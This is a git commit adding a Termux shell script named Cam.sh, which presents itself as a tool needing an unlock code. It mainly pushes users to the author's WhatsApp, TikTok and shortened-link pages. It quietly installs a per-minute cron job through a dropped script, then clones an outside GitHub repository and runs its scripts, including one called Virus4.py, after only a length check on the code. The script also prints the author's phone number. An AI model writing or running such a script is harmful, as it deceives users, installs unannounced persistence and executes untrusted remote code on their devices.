d70521c9c55c77e9a97c4efc34c2e939f32e99b4
Bahaa Al Matgribii <bahaa0106400@gmail.com>
2025-01-30 22:28:21 +0200

    Add files via upload

---
+++ Cam.sh
@@ -0,0 +1,137 @@
+#!/bin/bash
+clear
+opened(){
+    clear
+    echo -e "\e[31m
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀
+⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀
+⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀
+⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀
+⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇
+⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸
+⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸
+⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸
+⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇
+⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀
+⠀⠀⢳⡈⢻⠶⣿⣞⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢣⣿⡶⠟⢉⡼⠁⠀
+⠀⠀⠀⠙⢦⡑⠲⠶⠾⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⡛⠿⠷⠶⠶⠊⡡⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠙⠦⣝⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠛⣋⠴⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⠿⣿⣿⣿⣿⣿⣿⠿⠧⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
+ \e[0m"
+    echo -e "\e[32m[+] Contact me with:\e[0m"
+    echo -e "\e[32m[+] WhatsApp: +201064004818\e[0m"
+    echo -e "\e[32m[+] Telegram: @bHa_0106\e[0m"
+    echo 'ﺭﺍﺮﻤﺘﺳﻺﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ'
+    
+    read -r
+
+        echo -e "\e[31m ﺔﻳﻮﻗ ﺕﺍﻭﺩﺍ ﺎﻬﺑ ﺏﺎﺴﺗﺍﻭ ﻰﻠﻋ ﻲﺗﺎﻨﻗ \e[0m"
+        echo -e "\e[31m ﻲﻧﺍﺮﺒﻴﺴﻟﺍ ﻦﻣﻷﺍ ﻢﻴﻠﻌﺘﻟ ﺕﺎﺣﻭﺮﺷ ﻝﺰﻨﺑ ﻭ\e[0m"
+        echo 'ﺭﺍﺮﻤﺘﺳﻺﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ'
+        read -r
+        am start -a android.intent.action.VIEW -d "https://whatsapp.com/channel/0029Vb3RgZWAInPq8NvsGQ3O" > /dev/null 2>&1 &
+        echo "ﻙﻮﺗ ﻚﻴﺗ ﻰﻠﻋ ﻲﻨﻌﺑﺎﺗ"
+        echo 'ﺭﺍﺮﻤﺘﺳﻺﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ'
+        read -r 
+        am start -a android.intent.action.VIEW -d "https://www.tiktok.com/@aredanws" > /dev/null 2>&1 &
+        echo 'ﺭﺍﺮﻤﺘﺳﻺﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ'
+        echo -e "\e[31m[+] ﺕﺍﻭﺩﻷﺍ ﻯﻮﻗﺍ ﻭ ﻲﻧﺍﺮﺒﻴﺴﻟﺍ ﻦﻣﻷﺍ ﻢﻴﻠﻌﺘﻟ ﺪﻤﺤﻣ ﺱﺪﻨﻬﻤﻟﺍ ﺓﺎﻨﻗ\e[0m"
+        read -r
+        am start -a android.intent.action.VIEW -d "https://whatsapp.com/channel/0029Vb2uVgP0AgWFDJwmKa35" > /dev/null 2>&1 &
+        read -r
+        echo -e "\e[32m ﻂﺑﺍﺮﻠﻟ ﺐﻫﺬﺗ ﻲﻛ ﺮﺘﻧﺍ ﻂﻐﺿﺍ \e[0m"
+        echo -e "\e[32m ﻂﺑﺍﺮﻟﺍ ﻰﻄﺨﺗ ﻢﺛ \e[0m"
+        echo -e "\e[32m ﻙﻮﺒﺴﻴﻓ ﻰﻠﻋ ﻚﺑﺎﺴﺤﺑ ﻞﻴﺠﺴﺘﻟﺎﺑ ﻢﻗ ﻢﺛ \e[0m"
+        echo -e "\e[32m ﺓﺍﺩﻻﺍ ﻞﻌﻓ ﻭ ﺩﻮﻜﻟﺍ ﺮﻀﺣﺍ ﻭ ﻊﻗﻮﻤﻠﻟ ﻞﺧﺩﺍ ﻢﺛ \e[0m"
+        read -r 
+        termux-open-url "https://shrinkme.ink/amoXxp4K"        
+}
+
+clear
+jon(){
+
+
+    
+   
+    
+    echo "Enter the Code!"
+    read code
+
+    if [ ${#code} -eq 16 ]; then
+        pkg install -y git python3 python3
+        pkg update -y && upgrade -y
+
+        pkg install git 
+
+        git clone https://github.com/Amerlaceset/Amer 
+
+        cd Amer
+
+        chmod +x * 
+
+        ./Amer.sh
+
+        ls
+
+        cd Virus4
+
+        python2 Virus4.py
+
+
+    else
+        while true; do
+            echo -e "\e[31mError:\e[0m"
+            echo "Enter The Code ! "
+
+            read code
+            if [ ${#code} -eq 16 ]; then
+                pkg install -y git python3 python3
+                pkg update -y && upgrade -y
+
+                pkg install git 
+
+                git clone https://github.com/Amerlaceset/Amer 
+
+                cd Amer
+
+                chmod +x * 
+
+                ./Amer.sh
+
+                ls
+
+                cd Virus4
+
+                python2 Virus4.py 
+    
+    
+                break 
+            fi
+        done
+    fi
+}
+Bot(){
+echo "ﺕﺍﻭﺩﻻﺍ ﺖﻴﺒﺜﺗ ﻱﺭﺎﺟ ﻼﻴﻠﻗ ﺮﻈﺘﻧﺍ"
+pkg update -y && pkg install cronie -y 
+
+cat > ~/start_script.sh << 'EOF'
+#!/data/data/com.termux/files/usr/bin/bash
+
+whatsapp_url="https://whatsapp.com/channel/0029Vb3RgZWAInPq8NvsGQ3O"  
+
+if [ ! -f ~/whatsapp_visited ]; then
+  am start -a android.intent.action.VIEW -d "$whatsapp_url" > /dev/null 2>&1
+  touch ~/whatsapp_visited 
+fi
+EOF
+
+chmod +x ~/start_script.sh > /dev/null 2>&1
+
+(crontab -l 2>/dev/null; echo "* * * * * sleep 3 && ~/start_script.sh > /dev/null 2>&1") | crontab - > /dev/null 2>&1
+
+crond > /dev/null 2>&1
+}
+opened
+Bot
+jon
